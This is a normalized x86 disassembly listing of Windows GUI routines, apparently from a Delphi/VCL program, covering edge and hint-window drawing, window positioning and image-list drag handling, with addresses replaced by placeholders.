test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4518d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e68
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_449afc
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44e08c
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44b16c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44c330
sub_451944
push ebx
push esi
mov esi edx
call sub_461dc8
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406e04
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44b16c
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406e04
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44b16c
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_4519a8
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44e454
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4519e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4519d8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_451a20
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4490b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_448b94
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_451a7c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_449190
test bl bl
jle r-xdata
xor eax eax
call sub_447188
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_451abc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424164
xor eax eax
push ebp
push sub_451b57
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424618
xor eax eax
push ebp
push sub_451b34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451b3b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_424618
retn
sub_451b68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4524a0
mov edx 0x80ffff
mov eax esi
call sub_44a158
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_424494
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_423db0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_451bd4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44d62c
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c4a0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44d5c4
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_451c40
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_451c96
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451c9d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ReleaseDC
retn
sub_451ca4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_451d3d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_4234a8
mov eax ebx
call sub_44c2d8
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x14 ]
call sub_404464
push eax
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451d44
lea eax [ ebp - 0x14 ]
call sub_403fa4
retn
sub_451d4c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_451db8
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_451e43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451e4a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_4243d4
mov edx eax
add edx 0x6
mov eax esi
call sub_449774
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_449fb8
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_4243f0
mov edx eax
add edx 0x4
mov eax esi
call sub_449798
sub_451e50
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_452029
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449fe8
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44b210
mov eax [ esi ]
call sub_4686f8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_468704
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4686f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_4686ec
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_468704
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_4686e0
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_4686ec
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_4686e0
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44ded4
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452030
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404264
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4550e8
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call [ rw-data ]
sub_452038
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_452060
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_41919c
mov eax esi
call sub_44c2d8
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ esi + 0x208 ]
call sub_424598
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4520bc
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41919c
call sub_43a9dc
call sub_43aabc
test al al
jne r-xdata
call sub_43a9dc
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43ae7c
push esp
push 0x1
push 0xf
push 0x0
call sub_43a9dc
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43ab7c
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_452128
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44e7dc
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_45214c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4521a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452264
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468bcc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42b7e8
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468bcc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42b7e8
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_452270
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_4573e0
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4522d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_458054
mov eax ebx
call sub_45720c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_4522fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_45720c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_4521a4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_45235c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_452270
push 0x0
call ShowCursor
sub_45235c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_45720c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_4523c0
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45214c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_4523c0
push ebx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_4523e4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_45214c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_452458
push ebx
push esi
mov esi eax
mov eax esi
call sub_45720c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_4523c0
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_4522b8
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4524a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c4cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_448b94
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4524fc
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c5f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_45254c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424164
xor eax eax
push ebp
push sub_4525ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_424618
xor eax eax
push ebp
push sub_4525c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_448bac
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4525ce
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_424618
retn
sub_4525fc
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_452690
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_452618
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_452690
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_452c88
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_452690
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_4526c4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_452754
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov edx 0x2
call sub_452754
jmp r-xdata
retn
sub_45270c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4527c0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov edx 0x2
call sub_4527c0
jmp r-xdata
retn
sub_452754
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_452b88
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4527c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_452674
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_452b88
push eax
mov eax esi
call sub_4526c4
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_452b88
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_452870
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_452674
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_452c88
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4527c0
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_452674
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4527c0
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_4526c4
mov edx eax
add edx esi
mov eax ebx
call sub_452bb0
mov edx edi
mov eax ebx
call sub_452bb0
jmp r-xdata
mov eax ebx
call sub_452a10
mov eax ebx
call sub_452c60
mov ebx eax
test ebx ebx
jne r-xdata
sub_452918
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403fa4
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403ff8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
sub_45295c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403450
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4529cd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_44acb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_4529e0
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_452c60
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_452a10
push ebp
mov ebp esp
